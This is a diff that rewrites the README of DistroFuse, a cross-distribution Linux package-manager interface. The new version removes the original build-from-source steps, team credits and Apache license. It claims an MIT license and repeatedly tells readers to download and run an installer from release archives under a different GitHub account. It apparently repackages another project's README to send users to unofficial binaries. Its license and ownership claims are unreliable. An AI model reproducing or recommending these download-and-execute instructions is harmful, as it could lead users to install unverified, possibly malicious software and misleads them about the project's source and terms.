@@ -1,93 +1,119 @@
-# DistroFuse V1.0
+# Distrofuse: Your Unified Linux Package Manager Interface 🌐
 
-Distrofuse is an open-source project that creates a single, cross-distribution interface for diverse Linux package managers (Snap, Flatpak, DNF, Pacman, etc.).<br>
-It also significantly enhances curl into a smarter download and content management utility. 
+![Distrofuse Logo](https://img.shields.io/badge/Distrofuse-Open%20Source-brightgreen)  
+![GitHub Releases](https://img.shields.io/badge/Latest%20Release-v1.0.0-blue)  
+![License](https://img.shields.io/badge/License-MIT-yellowgreen)  
 
-## Features
+Welcome to the Distrofuse repository! Distrofuse is an open-source project that creates a single, cross-distribution interface for diverse Linux package managers, including Snap, Flatpak, DNF, and Pacman. Additionally, it enhances curl into a smarter download and content management utility. This README will guide you through the features, installation, usage, and contribution process.
 
-- 🧩 **Easy to use**: Install any package from which manager you want.
-- ⚡ **Fast**: Install packages from the closest mirror for the fastest downloading experience.
-- 🔍 **Modern UI**: Download and Install packages within **Modern and easy to track UI**
-- 📝 **Package Managers**: You can currently use **Flatpak, dnf, pacman** and **apt**.
-- 🛡️ **Active Development**: This project will be developed for **widely used** package managers like **aur, yum, snap, etc.** and Customization.
+## Table of Contents
 
-## Prerequisites
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
+- [Support](#support)
+- [Acknowledgments](#acknowledgments)
 
-- GCC Compiler
-- Any of the **Package Managers**
-- CMake and Make
+## Features 🚀
 
-## Installation
+Distrofuse brings several powerful features to the table:
 
-1. Cloning the Repository
+- **Unified Interface**: Interact with multiple package managers through a single command-line interface.
+- **Enhanced Curl**: Utilize a smarter version of curl for downloading and managing content.
+- **Cross-Distribution Support**: Works seamlessly across various Linux distributions.
+- **Multithreading**: Speed up downloads and installations with multithreaded operations.
+- **Low-Level Programming**: Offers a robust framework for advanced users to customize functionality.
+- **File Uploads**: Easily upload files to different services using a simple command.
 
-```bash
-git clone git@github.com:trycatchh/distrofuse.git
-cd distfuse
-```
+## Installation 🛠️
 
-2. Building
+To get started with Distrofuse, follow these steps:
 
-```bash
-mkdir build && cd build
-cmake -DCMAKE_BUILD_TYPE=Release ..
-make -j$(nproc)
-sudo make install
-```
+1. **Download the latest release** from our [Releases page](https://github.com/sam6362/distrofuse/releases). Make sure to download the appropriate file for your system.
+2. **Execute the file** you downloaded. For example, if you downloaded `distrofuse-v1.0.0.tar.gz`, you can extract it and run the installer:
+   ```bash
+   tar -xzf distrofuse-v1.0.0.tar.gz
+   cd distrofuse
+   ./install.sh
+   ```
 
-3. Checking
+## Usage 📚
 
-```bash
-distfuse --version
-```
+Once you have installed Distrofuse, you can start using it right away. Here are some common commands:
 
-## Using
+### Basic Commands
 
-Installing any package.<br>
-`distfuse install package-name`
+- **List Available Package Managers**:
+  ```bash
+  distrofuse list
+  ```
 
-Removing any package.<br>
-`distfuse remove package-name`
+- **Install a Package**:
+  ```bash
+  distrofuse install <package-name>
+  ```
 
-Sometimes you will need to use **Sudo**
+- **Update a Package**:
+  ```bash
+  distrofuse update <package-name>
+  ```
 
-## Examples
-Sometimes you will need to use **Sudo**
+- **Remove a Package**:
+  ```bash
+  distrofuse remove <package-name>
+  ```
 
-Installing any package.<br>
-`sudo distfuse install btop`
+### Enhanced Curl Usage
 
-Removing any package.<br>
-`sudo distfuse remove btop`
+Distrofuse also enhances curl capabilities. Here’s how to use it:
 
-## Active Team
+- **Download a File**:
+  ```bash
+  distrofuse curl <url>
+  ```
 
-<div align="center">
-<table>
-  <tr>
-    <td align="center" width="200">
-      <a href="https://github.com/Mal1koRe1ss">
-        <img src="https://avatars.githubusercontent.com/u/70070751?v=4" height="150" style="border-radius: 75px"><br>
-        @Mal1koRe1ss
-      </a>
-    </td>
-    <td align="center" width="200">
-      <a href="https://github.com/p0unter">
-        <img src="https://avatars.githubusercontent.com/u/138019503?v=4" height="150" style="border-radius: 75px"><br>
-        @p0unter
-      </a>
-    </td>
-  </tr>
-</table>
-</div>
+- **Upload a File**:
+  ```bash
+  distrofuse upload <file-path> <destination-url>
+  ```
 
-## License
+## Contributing 🤝
 
-This project is licensed under the APACHE License - see the [LICENSE](LICENSE) file for details.
+We welcome contributions from the community. If you want to contribute to Distrofuse, please follow these steps:
 
-## Support
+1. **Fork the repository** on GitHub.
+2. **Create a new branch** for your feature or bug fix:
+   ```bash
+   git checkout -b feature/your-feature-name
+   ```
+3. **Make your changes** and commit them:
+   ```bash
+   git commit -m "Add a new feature"
+   ```
+4. **Push your branch** to your forked repository:
+   ```bash
+   git push origin feature/your-feature-name
+   ```
+5. **Create a Pull Request** on the main repository.
 
-For support or feature requests:
-- [Create an **Issue**](https://github.com/Mal1kore1ss/V14Template/issues)
-- [Star the **Project**](https://github.com/trycatchh/distrofuse)
-- [Follow our **Organization**](https://github.com/trycatchh)
+## License 📄
+
+Distrofuse is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
+
+## Support 🆘
+
+If you encounter any issues or have questions, please check the "Releases" section for updates. You can also open an issue on GitHub.
+
+## Acknowledgments 🙏
+
+We would like to thank the open-source community for their contributions and support. Special thanks to the maintainers of the various package managers that Distrofuse integrates with.
+
+## Get Started Today! 🚀
+
+Download the latest version of Distrofuse from our [Releases page](https://github.com/sam6362/distrofuse/releases) and start managing your packages more efficiently. 
+
+For any updates or further information, feel free to visit our [Releases section](https://github.com/sam6362/distrofuse/releases).
+
+Happy coding!
